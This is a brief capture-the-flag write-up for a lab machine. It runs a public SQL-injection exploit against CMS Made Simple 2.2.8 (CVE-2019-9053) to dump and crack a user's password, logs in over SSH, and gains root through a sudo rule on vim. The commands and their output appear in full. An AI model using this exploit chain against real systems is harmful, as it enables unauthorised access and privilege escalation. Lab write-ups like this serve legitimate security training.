# Easy CTF
- IP: 10.10.177.101

## Open Ports
```
21/tcp   open  ftp
80/tcp   open  http
2222/tcp open  ssh
```

## Directories (80/tcp)
- `/robots.txt`
- `/simple/` -> CMS Made Simple 2.2.8

## CMS Made Simple 2.2.8
- `searchsploit cms made simple 2.2`
  - `CMS Made Simple < 2.2.10 - SQL Injection              | php/webapps/46635.py`
  - `CVE-2019-9053`
  - `python /usr/share/exploitdb/exploits/php/webapps/46635.py -u http://10.10.177.101/simple --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt`
```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

## SSH
- `ssh mitch$IP -p 2222`
- User flag: `cat user.txt
- Other user: `sunbath`

- `./linpeas.sh | tee linlog.txt` -> (root) NOPASSWD: /usr/bin/vim
- or `sudo -l` -> (root) NOPASSWD: /usr/bin/vim

## Privilege Escalation
- `sudo vim random`
- `:!sh`
- `whoami` -> root

- `cd /root`
- `cat root.txt` -> W3ll d0n3. You made it!

SOLVED
